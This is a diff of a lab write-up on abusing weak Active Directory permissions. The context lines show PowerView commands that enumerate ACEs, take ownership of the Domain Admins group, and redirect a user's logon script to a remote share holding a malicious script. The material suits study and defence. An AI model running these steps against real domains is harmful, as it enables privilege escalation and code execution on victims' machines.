@@ -1,9 +1,5 @@
 # Abusing Active Directory ACLs/ACEs
 
-{% hint style="danger" %}
-WIP
-{% endhint %}
-
 ## Context
 
 In this lab I am exploring ways to abuse weak permissions of Active Directory Distrctionary Access Control Lists \(DACLs\) and their Acccess Control Entries \(ACEs\).
@@ -162,7 +158,7 @@ Note how before the attack the owner of "Domain Admins" is "Domain Admins":
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-36.png)
 
-After enumeration, if we find that a user in our control has `WriteOwner` rights...:
+After ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
 
 ```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
@@ -170,7 +166,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=o
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-42.png)
 
-...we can change the `Domain Admins` object's owner to our user, which our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
+...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
 
 ```csharp
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -184,11 +180,9 @@ Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -Ow
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-`WriteProperty` on a specific `ObjectType`, which in this case is `Script-Path` allows us to simply write to that attribute:
-
 ![](../../.gitbook/assets/screenshot-from-2018-11-08-19-12-04.png)
 
-In this case, we are overwriting the logon script path of the `delegate` user, so that the next time they logon, they will execute our malicious script:
+`WriteProperty` on a specific `ObjectType`, which in this case is `Script-Path` allows us to simply overwrite the logon script path of the `delegate` user, so that when the next time they logon, their system will execute our malicious script:
 
 ```csharp
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
